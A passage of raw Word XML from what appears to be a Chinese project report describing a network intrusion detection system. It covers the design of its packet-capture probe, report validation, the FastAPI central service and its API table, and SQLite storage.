        <w:t>探针用 scapy 在指定网卡上抓包，逐层解封装到 IP 与传输层首部，取出五元组、时间戳、标志位、载荷长度等原始量，再按“双向会话”聚合：以 (协议, IP_A, port_A, IP_B, port_B) 的规范化形式作键，A/B 两端按固定顺序归一，保证同一会话的正反两个方向落进同一条记录。会话在空闲超过阈值后封口，输出一条完整记录。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="539C1008">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>有几个细节是踩过坑之后才定下来的。空闲超时取 120 秒，与 CIC-IDS2017 的采集口径一致；默认的 30 秒会把同一条长流切成好几段，特征向量的形态随之全变。原始帧同时按 pcap 格式落盘，会话特征另存 CSV，两者用会话键关联，任何一条告警都能回到 Wireshark 里逐帧核对——这也是“陈列式”工具在本项目里的位置：不取代它，而是把它当作可核查的下游证据源。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009173DC">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>探针不负责判断，只负责“把帧变成一行数字”。这条边界是刻意划的：如果把分类器放到探针里，每台机器都要带一份模型与 scaler，模型一更新就要重新分发；放到中心则只需要更新一处。代价是上报带宽，所以上报的是特征向量而不是原始帧。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19856BAB">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>抓包需要 root 或 CAP_NET_RAW 能力。答辩机上没有这个权限，因此实际演示时用一个回放脚本替代嗅探这一环：它从数据集里按类别取会话，按每 2 秒 2 条的节奏经 POST /api/v1/report 送进中心，特征向量、推理、告警、报告全部走真实代码路径，唯一被替换的是“帧从哪里来”。这一点在答辩时要主动说明，不能把回放说成真实抓包。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F57F2FD">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.2.2 上报格式与列序校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69803B7E">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>上报报文故意带上 feature_names，让中心端能当场比对训练时的列序。这个设计看起来是多余的，但它挡住的是一类最难发现的错误：列序一旦错位，模型不会报错——它只会把“目的端口”当成“流时长”去推理，然后给出一个看起来正常的错误答案。中心端收到列序不符直接返回 400，而不是按名字重排，因为重排会把“缺列”悄悄变成“错位”。宁可丢一批数据，也不能用错位的特征去推理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D574FB2">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.2.3 中心服务：鉴权、存储与告警升级</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DDAA484">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>中心服务是一个 FastAPI 应用。探针上报时用 X-Probe-Token 请求头做共享令牌鉴权，令牌值从 config.yaml 读入并由 hmac.compare_digest 比较，避免普通字符串比较的时序侧信道。报文结构由 Pydantic 约束，单批流数上限 2 000 条，超出返回 413。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41DB1AB0">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>表 3-3　中心服务接口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0"/>
        <w:gridCol w:w="2608"/>
        <w:gridCol w:w="4082"/>
        <w:gridCol w:w="1361"/>
      </w:tblGrid>
      <w:tr w14:paraId="53D9E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20" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="681757CD">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>方法</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7A8257F4">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>路径</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4082" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="23342B0E">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>用途</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1361" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6C26F50A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>鉴权</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="19BBC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2DDE5D90">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1D58A2BE">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>/healthz</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4082" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="28EECB9D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>健康检查与时间戳</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1361" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5875EBDC">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>无</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="5B50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0CBD4758">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7C7CBA9E">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>/api/v1/report</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4082" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7072DBBF">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>探针上报一批会话特征，返回被接受的条数与告警编号</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1361" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1F81DEA5">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>需要 Token</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="0DE7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020" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7C160E1C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="38F4BBF0">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>/api/v1/flows</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4082" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="20E19796">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>会话流水（只回展示用特征列，78 维整包不下发）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1361" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="79D698D9">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>需要 Token</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="0F62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01ADB1F9">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="624C904A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>/api/v1/alerts</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4082" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0DEEE05D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>按时间、探针、类别查询告警</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1361" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="64AD3ED2">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>需要 Token</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="47971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7415D8C4">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5D880FEC">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>/api/v1/alerts/{id}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4082" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4DA0B912">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>单条告警及其诊断报告</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1361" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0738B9ED">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>需要 Token</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="4DC80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454DEBA1">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="37180DFC">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>/api/v1/diagnose</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4082" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="235C696D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>对指定告警触发或重跑诊断</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1361" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7D0DBD48">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>需要 Token</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="628E1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020" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1D737827">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="678848AB">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>/api/v1/chat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4082" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="297B71D1">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>针对某份报告的多轮追问</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1361" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6D8486FA">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>需要 Token</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="46014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20" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0C2D7185">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2608" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="50F13EA1">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>/api/v1/stats</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4082" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="77348CB3">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>看板用的统计（时序、分布、汇总、规则计数）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1361" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0BD63CBE">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>需要 Token</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4288FDAE">
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="421EF649">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>存储用 SQLite 四张表：flows（会话特征与判定）、alerts（告警，含 source 与超阈值倍数）、reports（大模型报告正文与耗时）、chat（追问记录）。选 SQLite 是因为演示规模下单机读写足够，不需要额外部署数据库服务。表结构里留了补列逻辑——CREATE TABLE IF NOT EXISTS 不会给已存在的表加列，少了这一步，老库上读 source 列会直接 KeyError。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B1F9FD4">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
